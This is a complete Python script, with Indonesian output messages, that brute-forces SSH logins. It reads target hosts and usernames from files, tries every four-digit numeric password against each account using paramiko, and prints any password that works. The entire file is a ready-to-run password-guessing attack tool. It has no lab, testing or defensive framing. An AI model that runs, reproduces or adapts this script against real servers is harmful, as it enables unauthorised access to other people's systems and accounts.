import paramiko
from itertools import product
import sys

def try_ssh(host, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=password, timeout=3)
        print(f"[SUCCESS] Host: {host} | User: {username} | Password ditemukan: {password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[FAILED] Host: {host} | User: {username} | Password: {password}")
        return False
    except Exception as e:
        print(f"[ERROR] Host: {host} | User: {username} | Password: {password} - {e}")
        return False

def brute_force_ssh(hosts, users):
    print(f"Mulai brute force SSH untuk semua host dan user dengan kombinasi angka 4 digit...")
    for host in hosts:
        for user in users:
            print(f"\nMencoba Host: {host} | User: {user}")
            for combo in product("0123456789", repeat=4):
                password = ''.join(combo)
                if try_ssh(host, user, password):
                    print("Brute force selesai untuk kombinasi ini.\n")
                    break

def load_list(filename):
    with open(filename, "r") as f:
        lines = [line.strip() for line in f if line.strip()]
    return lines

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python brute_ssh_multi.py <hosts_file> <users_file>")
        sys.exit(1)
    
    hosts_file = sys.argv[1]
    users_file = sys.argv[2]

    hosts = load_list(hosts_file)
    users = load_list(users_file)

    brute_force_ssh(hosts, users)
